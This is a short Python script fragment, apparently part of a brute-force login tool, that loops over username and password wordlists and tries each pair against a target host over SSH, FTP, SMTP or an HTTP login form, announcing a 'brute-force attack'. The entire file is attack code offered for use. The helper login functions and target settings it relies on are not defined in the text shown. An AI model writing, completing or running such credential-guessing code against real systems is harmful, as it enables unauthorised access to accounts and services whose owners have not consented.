# -*- coding: utf-8 -*-
"""
Created on Sun Jun 22 15:43:17 2025

@author: mayuk
"""


# Brute-force engine 
def brute_force():
    with open(username_file, "r") as users, open(password_file, "r") as passwords:
        user_list = [u.strip() for u in users]
        pass_list = [p.strip() for p in passwords]

        for username in user_list:
            for password in pass_list:
                if time.time() - start_time > timeout_seconds:
                    print("⏱️ Time ended. Attack stopped automatically.")
                    return

                if protocol == "ssh":
                    if try_ssh_login(target_ip, target_port, username, password):
                        return
                elif protocol == "ftp":
                    if try_ftp_login(target_ip, target_port, username, password):
                        return
                elif protocol == "smtp":
                    if try_smtp_login(target_ip, target_port, username, password):
                        return
                elif protocol == "http":
                    if try_http_login(login_url, username, password):
                        return
                else:
                    print(f"❌ Unsupported protocol: {protocol}")
                    return

# Start the attack 
print(f"\n🔐 Starting brute-force attack on {protocol.upper()}://{target_ip}:{target_port}")
brute_force()
print("✅ Attack finished.")